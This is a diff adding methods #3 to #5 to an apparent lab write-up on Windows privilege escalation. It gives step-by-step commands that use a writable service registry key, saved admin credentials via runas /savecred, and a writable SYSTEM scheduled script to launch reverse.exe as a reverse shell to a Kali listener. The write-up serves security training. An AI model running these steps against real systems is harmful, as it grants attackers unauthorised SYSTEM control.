@@ -51,3 +51,54 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 ### (Method #3)
 
+Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE\_START\_NAME).
+
+`sc qc regsvc`
+
+Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+
+`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
+
+Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
+
+`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
+
+<figure><img src=".gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+`net start regsvc`
+
+<figure><img src=".gitbook/assets/7.png" alt="" width="267"><figcaption></figcaption></figure>
+
+### (Method #4)
+
+List any saved credentials:
+
+`cmdkey /list`
+
+Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
+
+Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
+
+`runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+
+<figure><img src=".gitbook/assets/8.png" alt=""><figcaption></figcaption></figure>
+
+### (Method #5)
+
+View the contents of the C:\DevTools\CleanUp.ps1 script:
+
+`type C:\DevTools\CleanUp.ps1`
+
+The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
+
+`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
+
+Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
+
+`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
+
+Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM
+
+<figure><img src=".gitbook/assets/9.png" alt=""><figcaption></figcaption></figure>
